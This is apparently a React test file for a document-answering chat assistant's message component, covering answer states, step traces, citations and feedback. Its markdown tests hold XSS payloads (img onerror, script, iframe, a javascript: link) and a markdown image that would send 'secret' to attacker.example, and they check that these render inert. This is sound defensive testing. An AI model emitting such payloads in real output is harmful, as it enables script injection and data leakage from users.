import { render, screen, waitFor, within } from "@testing-library/react"
import userEvent from "@testing-library/user-event"
import { describe, expect, it, vi } from "vitest"

import { AssistantMessage, type AnswerActions, type Message } from "@/components/chat-answer"
import { mockApi, withProviders } from "@/test/render"

const REFUND = { title: "refund.md", provider: "Company documents", url: null }

function show(message: Partial<Message>, actions: Partial<AnswerActions> = {}) {
  const all: AnswerActions = {
    onRetry: vi.fn(),
    onRephrase: vi.fn(),
    onFeedback: vi.fn(),
    ...actions,
  }
  render(
    withProviders(
      <AssistantMessage
        message={{ key: "a1", id: "m1", role: "assistant", text: "", ...message }}
        actions={all}
      />,
    ),
  )
  return all
}

describe("answer states", () => {
  it("shows an answer from the documents with its sources and feedback", () => {
    show({ state: "answered", text: "Refunds take thirty days.", sources: [REFUND] })
    expect(screen.getByText("Refunds take thirty days.")).toBeInTheDocument()
    expect(screen.getByText("refund.md")).toBeInTheDocument()
    expect(screen.queryByRole("alert")).not.toBeInTheDocument()
    expect(screen.getByRole("button", { name: "Helpful" })).toBeInTheDocument()
    expect(screen.getByRole("button", { name: "Not helpful" })).toBeInTheDocument()
  })

  it("says plainly when the documents don't cover it, and offers to rephrase", async () => {
    const actions = show({
      state: "not_found",
      text: "I don't know based on the documents.",
      question: "Where do I park?",
    })
    const alert = screen.getByRole("alert")
    expect(alert).toHaveTextContent("Your documents don't cover this")
    await userEvent.setup().click(screen.getByRole("button", { name: "Rephrase" }))
    expect(actions.onRephrase).toHaveBeenCalledWith("Where do I park?")
  })

  it("offers to ask across the workspace when a space doesn't cover it", async () => {
    const onAskEverywhere = vi.fn()
    show({ state: "not_found", text: "I don't know.", question: "What is DevIQ?" }, { onAskEverywhere })
    await userEvent.setup().click(screen.getByRole("button", { name: "Ask in All company" }))
    expect(onAskEverywhere).toHaveBeenCalledWith("What is DevIQ?")
  })

  it("doesn't offer All company outside a space", () => {
    show({ state: "not_found", text: "I don't know.", question: "What is DevIQ?" })
    expect(screen.queryByRole("button", { name: "Ask in All company" })).not.toBeInTheDocument()
  })

  it("lets someone tell an admin a document is missing", async () => {
    const fetch = mockApi({
      "PUT /api/messages/m1/feedback": { rating: -1, reasons: ["missing"], comment: null },
    })
    const actions = show({ state: "not_found", text: "I don't know." })
    await userEvent.setup().click(screen.getByRole("button", { name: "Tell an admin it's missing" }))
    await waitFor(() => expect(actions.onFeedback).toHaveBeenCalled())
    expect(JSON.parse(fetch.mock.calls[0][1]!.body as string)).toEqual({
      rating: -1,
      reasons: ["missing"],
      comment: null,
    })
  })

  it("shows a refusal as a notice, not an answer", () => {
    show({ state: "blocked", text: "Staff salary information is restricted to HR / Admin." })
    expect(screen.getByRole("alert")).toHaveTextContent("Can't answer that")
    expect(screen.getByRole("alert")).toHaveTextContent("restricted to HR / Admin")
  })

  it("offers Try again on a failed answer", async () => {
    const actions = show({ state: "error", text: "Something went wrong: APIConnectionError" })
    expect(screen.getByRole("alert")).toHaveTextContent("Couldn't answer")
    expect(screen.queryByRole("button", { name: "Helpful" })).not.toBeInTheDocument()
    await userEvent.setup().click(screen.getByRole("button", { name: "Try again" }))
    expect(actions.onRetry).toHaveBeenCalledWith(expect.objectContaining({ id: "m1" }))
  })

  it("keeps what a stopped answer had written, with Try again", () => {
    show({ state: "stopped", text: "Refunds are paid" })
    expect(screen.getByText("Refunds are paid")).toBeInTheDocument()
    expect(screen.getByText("Stopped before the end")).toBeInTheDocument()
    expect(screen.getByRole("button", { name: "Try again" })).toBeInTheDocument()
  })

  it("notes a partial answer above it", () => {
    show({ state: "partial", text: "Refunds take thirty days.", sources: [REFUND] })
    expect(screen.getByText(/Partly answered/)).toBeInTheDocument()
  })

  it("labels general knowledge as not from the documents", () => {
    show({
      state: "general_knowledge",
      text: "Alan Turing was a mathematician.",
      sources: [
        {
          title: "Alan Turing",
          provider: "Wikipedia",
          url: "https://en.wikipedia.org/wiki/Alan_Turing",
          kind: "general_knowledge",
        },
      ],
    })
    expect(screen.getByText("General knowledge, not from your documents")).toBeInTheDocument()
    expect(screen.getByRole("link", { name: /^Alan Turing, General knowledge · Wikipedia/ })).toHaveAttribute(
      "href",
      "https://en.wikipedia.org/wiki/Alan_Turing",
    )
  })

  it("hides an answer the viewer's role can't see any more", () => {
    show({ state: "answered", text: "", withheld: true, sources: [REFUND] })
    expect(screen.getByRole("alert")).toHaveTextContent("Answer hidden")
    expect(screen.queryByText("refund.md")).not.toBeInTheDocument()
    expect(screen.queryByRole("button", { name: "Helpful" })).not.toBeInTheDocument()
  })
})

describe("the steps trace", () => {
  const steps = [
    { id: "s1", tool: "search_docs", label: "Searching company docs", result: "found 1 relevant document", done: true },
  ]

  it("folds a finished answer's steps into one line, and shows no raw tool input to members", async () => {
    show({ state: "answered", text: "ok", steps, trace: [{ tool: "search_docs" }] })
    const user = userEvent.setup()
    await user.click(screen.getByRole("button", { name: /Searched company docs · 1 document/ }))
    expect(screen.getByText("found 1 relevant document")).toBeInTheDocument()
    expect(screen.queryByText("Technical details")).not.toBeInTheDocument()
  })

  it("shows admins the technical details and what a follow-up searched for", async () => {
    show({
      state: "answered",
      text: "ok",
      steps,
      standalone: "How long does a refund take?",
      trace: [{ tool: "search_docs", input: { question: "refund" }, output: "Refunds..." }],
    })
    const user = userEvent.setup()
    await user.click(screen.getByRole("button", { name: /Searched company docs/ }))
    expect(screen.getByText("How long does a refund take?")).toBeInTheDocument()
    await user.click(screen.getByText("Technical details"))
    expect(screen.getByText(/"question": "refund"/)).toBeInTheDocument()
  })

  it("names the platforms each tool searched: Outline's own tools, and where the documents came from", async () => {
    show({
      state: "answered",
      text: "ok",
      steps: [
        steps[0],
        { id: "s2", tool: "search_outline", label: "Searching the Outline wiki", result: "found 2", done: true },
      ],
      sources: [
        { n: 1, title: "Handbook", provider: "GitHub", url: null },
        { n: 2, title: "Leave", provider: "Outline", url: null },
        { n: 3, title: "Thread", provider: "Slack", url: null },
        { n: 4, title: "Notes.pdf", provider: "Upload", url: null },
      ],
    })
    const summary = screen.getByRole("button", { name: /Searched company docs/ })
    expect(summary).toHaveTextContent("in GitHub, Outline, Slack")
    await userEvent.setup().click(summary)
    // The docs search lists where its documents were; the Outline search wears Outline's mark.
    expect(screen.getAllByText("in GitHub, Outline, Slack")).toHaveLength(2)
  })

  it("says what it is doing while it thinks, before any step", () => {
    show({ streaming: true, status: "Checking your question", steps: [] })
    expect(screen.getByRole("status")).toHaveTextContent("Reading the question")
    expect(screen.queryByText(/Thinking/)).not.toBeInTheDocument()
  })

  it("shows each step live: running, then done, with the thinking line following it", () => {
    show({
      streaming: true,
      steps: [
        { ...steps[0], startedAt: 0, ms: 800 },
        { id: "s2", tool: "search_outline", label: "Searching the Outline wiki for “leave”", done: false, startedAt: 5 },
      ],
    })
    expect(screen.getByText("Searched company docs")).toBeInTheDocument()
    expect(screen.getByText("found 1 relevant document · 0.8s")).toBeInTheDocument()
    expect(screen.getByText("Running:")).toBeInTheDocument()
    expect(screen.getAllByText("Searching the Outline wiki for “leave”").length).toBeGreaterThan(0)
    expect(screen.getByRole("status")).toHaveTextContent("Searching the Outline wiki for “leave”")
  })

  it("folds the steps once the answer starts streaming", () => {
    show({ streaming: true, text: "Refunds take", steps: [{ ...steps[0], startedAt: 0, ms: 1200 }] })
    const summary = screen.getByRole("button", { name: /Searched company docs · 1 document · 1.2s/ })
    expect(summary).toHaveAttribute("aria-expanded", "false")
    expect(screen.queryByRole("status")).not.toBeInTheDocument()
  })

  it("marks a step stopped mid-way as stopped, not done", async () => {
    show({
      state: "stopped",
      text: "",
      // Stop marks every step done, with no result.
      steps: [{ id: "s1", tool: "search_docs", label: "Searching company docs", done: true }],
    })
    await userEvent.setup().click(screen.getByRole("button", { name: /Stopped/ }))
    expect(screen.getByText("Stopped while searching company docs")).toBeInTheDocument()
    expect(screen.queryByText("Done:")).not.toBeInTheDocument()
  })

  it("says when a step was blocked or failed", async () => {
    show({
      state: "blocked",
      text: "Staff salary information is restricted to HR / Admin.",
      steps: [{ ...steps[0], result: "blocked by access rules" }],
    })
    await userEvent.setup().click(screen.getByRole("button", { name: /Blocked by access rules/ }))
    expect(screen.getByText("Blocked while searching company docs")).toBeInTheDocument()
  })

  it("shows members only the thinking line when an admin turned the steps off", () => {
    show({ streaming: true, steps: [] }, { hideSteps: true })
    expect(screen.getByRole("status")).toHaveTextContent("Reading the question")
    show({ streaming: true, text: "Refunds", steps: [] }, { hideSteps: true })
    expect(screen.queryAllByRole("button", { name: /Searched/ })).toHaveLength(0)
  })
})

describe("the answer's markdown", () => {
  it("renders no raw HTML: no image, script or frame from the answer's text", () => {
    const { container } = render(
      withProviders(
        <AssistantMessage
          message={{
            key: "a1",
            id: "m1",
            role: "assistant",
            state: "answered",
            text: 'Hi <img src=x onerror="alert(1)"> there <script>alert(2)</script><iframe src="https://attacker"></iframe> end',
          }}
          actions={{}}
        />,
      ),
    )
    expect(container.querySelector("img, script, iframe")).toBeNull()
    // The tags are dropped; what was between them is inert text.
    expect(container).toHaveTextContent(/Hi\s+there\s+alert\(2\)\s+end/)
  })

  it("shows a markdown image as its alt text and never loads it", () => {
    show({ state: "answered", text: "See ![secret chart](https://attacker.example/?q=secret)." })
    expect(document.querySelector("img")).toBeNull()
    expect(screen.getByText("[secret chart]")).toBeInTheDocument()
  })

  it("doesn't make a javascript: link live", () => {
    show({ state: "answered", text: "[click me](javascript:alert(1))" })
    const link = screen.getByText("click me").closest("a")
    expect(link?.getAttribute("href") ?? "").not.toMatch(/javascript:/i)
  })

  it("renders a table with the app's table, and code as a code block", () => {
    show({ state: "answered", text: "| Plan | Days |\n| --- | --- |\n| Basic | 18 |\n\n```\nline one\n```" })
    expect(screen.getByRole("table")).toBeInTheDocument()
    expect(screen.getByRole("cell", { name: "18" })).toBeInTheDocument()
    expect(document.querySelector("[data-slot=code-block]")).toHaveTextContent("line one")
  })

  it("fades words in while streaming, with a caret, and leaves plain text once done", () => {
    const { rerender } = render(
      withProviders(
        <AssistantMessage message={{ key: "a1", role: "assistant", text: "Refunds take thirty", streaming: true }} actions={{}} />,
      ),
    )
    expect(document.querySelectorAll(".kb-word")).toHaveLength(3)
    expect(document.querySelector(".kb-caret")).toHaveAttribute("aria-hidden", "true")
    rerender(
      withProviders(
        <AssistantMessage
          message={{ key: "a1", id: "m1", role: "assistant", text: "Refunds take thirty days.", state: "answered" }}
          actions={{}}
        />,
      ),
    )
    expect(screen.getByText("Refunds take thirty days.")).toBeInTheDocument()
    expect(document.querySelector(".kb-word, .kb-caret")).toBeNull()
  })

  it("animates nothing on an answer loaded from history", () => {
    show({
      state: "answered",
      text: "Refunds take 30 days [S1].",
      sources: [{ n: 1, title: "refund.md", provider: "Company documents", url: null, chunk_id: "c1", snippet: "x" }],
      followups: ["And returns?"],
    })
    expect(document.querySelector(".kb-pop, .kb-rise, .kb-fade, .kb-line-in, .kb-word")).toBeNull()
  })
})

describe("feedback", () => {
  it("asks why on thumbs down and sends the reasons and note", async () => {
    const fetch = mockApi({
      "PUT /api/messages/m1/feedback": (body: unknown) => body,
    })
    const actions = show({ state: "answered", text: "Refunds take thirty days." })
    const user = userEvent.setup()

    await user.click(screen.getByRole("button", { name: "Not helpful" }))
    await user.click(await screen.findByRole("button", { name: "Out of date" }))
    await user.click(screen.getByRole("button", { name: "Wrong source" }))
    await user.type(screen.getByRole("textbox", { name: "Note for an admin" }), "Changed in May")
    await user.click(screen.getByRole("button", { name: "Send feedback" }))

    await waitFor(() => expect(actions.onFeedback).toHaveBeenCalled())
    expect(JSON.parse(fetch.mock.calls[0][1]!.body as string)).toEqual({
      rating: -1,
      reasons: ["outdated", "wrong_source"],
      comment: "Changed in May",
    })
  })

  it("undoes a thumbs up with a second click", async () => {
    const fetch = mockApi({ "DELETE /api/messages/m1/feedback": { ok: true } })
    const actions = show({
      state: "answered",
      text: "ok",
      feedback: { rating: 1, reasons: [], comment: null },
    })
    const up = screen.getByRole("button", { name: "Helpful" })
    expect(up).toHaveAttribute("aria-pressed", "true")
    await userEvent.setup().click(up)
    await waitFor(() => expect(actions.onFeedback).toHaveBeenCalledWith(expect.anything(), null))
    expect(fetch.mock.calls[0][1]!.method).toBe("DELETE")
  })
})

describe("inline citations", () => {
  const HANDBOOK = {
    n: 1,
    title: "handbook.txt",
    provider: "Company documents",
    url: null,
    access: "public" as const,
    chunk_id: "c1",
    heading_path: "Refund policy",
    snippet: "Customers can request a full refund within 30 days of purchase.",
    modified: "2026-09-12T10:00:00+00:00",
    why: { rank: 1, of: 4, meaning: true, terms: ["refund"] },
  }
  const DRIVE = {
    n: 2,
    title: "Support plan",
    provider: "Google Drive",
    url: "https://docs.google.com/document/d/abc",
    access: "restricted" as const,
    chunk_id: "c2",
    page: 3,
    snippet: "Support is open Monday to Friday.",
    why: { rank: null, of: 4, meaning: false, terms: [] },
  }
  const ANSWER = "Refunds take 30 days [S1]. Support is open on weekdays [S2][S1]."

  it("shows each marker as a numbered chip, and the sources in that order", () => {
    show({ state: "answered", text: ANSWER, sources: [HANDBOOK, DRIVE] })
    expect(screen.queryByText(/\[S1\]/)).not.toBeInTheDocument()
    expect(
      screen.getAllByRole("button", { name: "Source 1: handbook.txt, Refund policy" }),
    ).toHaveLength(2)
    expect(screen.getByRole("button", { name: "Source 2: Support plan, Page 3" })).toHaveTextContent(
      "2",
    )
    const cards = screen.getAllByRole("button", { name: /^Open source/ })
    expect(cards.map((c) => c.getAttribute("aria-label"))).toEqual([
      "Open source 1: handbook.txt, Refund policy, Company documents",
      "Open source 2: Support plan, Page 3, Google Drive",
    ])
  })

  it("previews the passage on focus, with why it was found", async () => {
    show({ state: "answered", text: ANSWER, sources: [HANDBOOK, DRIVE] })
    await userEvent.setup().tab() // the first chip
    expect(await screen.findByText(HANDBOOK.snippet)).toBeInTheDocument()
    expect(
      screen.getByText(/Matched “refund”; ranked 1st of 4; close in meaning/),
    ).toBeInTheDocument()
  })

  it("opens an upload's passage from the index, highlighted in its context", async () => {
    mockApi({
      "GET /api/passages/c1": {
        ...HANDBOOK,
        text: HANDBOOK.snippet,
        before: "### Refund policy\n\n",
        after: "\n\n* After 30 days, refunds are **account credit**.",
      },
    })
    show({ state: "answered", text: ANSWER, sources: [HANDBOOK, DRIVE] })
    await userEvent.setup().click(screen.getAllByRole("button", { name: /^Source 1:/ })[0])
    const dialog = await screen.findByRole("dialog")
    await waitFor(() => expect(dialog).toHaveTextContent("refunds are account credit"))
    expect(within(dialog).getByRole("region", { name: "Cited passage" })).toHaveTextContent(HANDBOOK.snippet)
    // The document's markdown is rendered, not shown as its syntax.
    expect(within(dialog).getByRole("heading", { name: "Refund policy" })).toBeInTheDocument()
    expect(within(dialog).getByText("account credit", { selector: "strong" })).toBeInTheDocument()
    expect(dialog).not.toHaveTextContent("**")
    expect(dialog).not.toHaveTextContent("###")
    expect(screen.queryByRole("link", { name: "Open original" })).not.toBeInTheDocument()
  })

  it("opens a synced file's passage from its source card, with the original's link", async () => {
    mockApi({}) // gone from the index, or not for this role: the saved passage shows
    show({ state: "answered", text: ANSWER, sources: [HANDBOOK, DRIVE] })
    await userEvent.setup().click(screen.getByRole("button", { name: /^Open source 2/ }))
    const dialog = await screen.findByRole("dialog")
    await waitFor(() => expect(dialog).toHaveTextContent("This is the passage as it was cited"))
    expect(within(dialog).getByRole("region", { name: "Cited passage" })).toHaveTextContent(DRIVE.snippet)
    expect(dialog).toHaveTextContent("Restricted")
    expect(screen.getByRole("link", { name: "Open original" })).toHaveAttribute("href", DRIVE.url)
  })

  it("leaves markers in code alone, and numbers a chip whose source isn't known yet", () => {
    show({ streaming: true, text: "Use `[S1]` literally. Then [S3]." })
    expect(screen.getByText("[S1]")).toBeInTheDocument()
    expect(screen.getByText("3")).toBeInTheDocument()
    expect(screen.queryByRole("button", { name: /^Source/ })).not.toBeInTheDocument()
  })
})
